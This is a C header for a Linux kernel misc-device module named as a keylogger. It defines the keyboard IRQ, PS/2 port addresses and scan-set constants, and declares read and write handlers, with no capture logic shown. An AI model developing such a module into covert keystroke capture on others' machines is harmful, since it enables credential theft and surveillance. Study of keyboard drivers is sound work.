#ifndef KEYBOARD_H
# define KEYBOARD_H
 
# include <linux/module.h>
# include <linux/kernel.h>
# include <linux/init.h>
# include <linux/miscdevice.h>
# include <linux/fs.h>
# include <linux/device.h>
# include <linux/string.h>
# include <linux/list.h>
# include <linux/workqueue.h>
# include <linux/interrupt.h>
# include <linux/delay.h>
# include <linux/spinlock.h>
# include <asm/io.h>

# define KEYBOARD_IRQ	1

# define SIZE		1000


# define KEYBOARD_PORT	0x60
# define CTRL_PORT	0x64

# define ECHO		0xEE
# define SCAN_SET	0xF0

# define SCAN_SET_DATA	0x00
# define SCAN_SET_ONE	0x01
# define SCAN_SET_TWO	0x02
# define SCAN_SET_THREE	0x03

ssize_t keylogger_read(struct file *filp, char __user *buffer,
				size_t length, loff_t *offset);

ssize_t keylogger_write(struct file *filp, const char __user *buffer,
				size_t length, loff_t *offset);

struct file_operations keylogger_misc_fops;

#endif
